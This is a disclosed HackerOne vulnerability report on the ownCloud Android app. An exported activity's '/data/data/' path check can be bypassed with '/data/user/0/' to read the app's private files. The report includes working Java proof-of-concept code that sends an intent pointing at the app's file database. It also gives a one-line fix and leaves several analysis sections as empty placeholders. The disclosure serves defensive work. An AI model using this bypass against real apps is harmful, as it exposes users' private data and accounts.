---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '377107'
original_report_id: '377107'
title: Possible to steal any protected files on Android
weakness: Information Disclosure
team_handle: owncloud
created_at: '2018-07-04T13:55:25.764Z'
disclosed_at: '2021-11-15T08:40:27.842Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 112
asset_identifier: com.owncloud.android
asset_type: GOOGLE_PLAY_APP_ID
max_severity: medium
tags:
- hackerone
- information-disclosure
---

# Possible to steal any protected files on Android

## Metadata

- HackerOne Report ID: 377107
- Weakness: Information Disclosure
- Program: owncloud
- Disclosed At: 2021-11-15T08:40:27.842Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi. I have found an issue which allows to retrieve any files from `/data/data/com.owncloud.android/*` directory. The problem is in exported activity `com.owncloud.android.ui.activity.ReceiveExternalFilesActivity` which accepts a URI to download files. I see that you've added verification path `/data/data/`
You can bypass the verification using specifying an alternative path: `/data/user/0/com.owncloud.android/` 
Malicious code:
```java
        StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
        StrictMode.setVmPolicy(builder.build());
        Intent intent = new Intent("android.intent.action.SEND");
        intent.setClassName("com.owncloud.android", "com.owncloud.android.ui.activity.ReceiveExternalFilesActivity");
        intent.setType("*/*");
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        intent.putExtra("android.intent.extra.STREAM", Uri.parse("file:///data/user/0/com.owncloud.android/databases/filelist"));
        startActivity(intent);
```
###How to Fix
Add an alternative path to the folder check

## Impact

This vulnerability can get a complete account, malware can access everything, including, file database and history.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
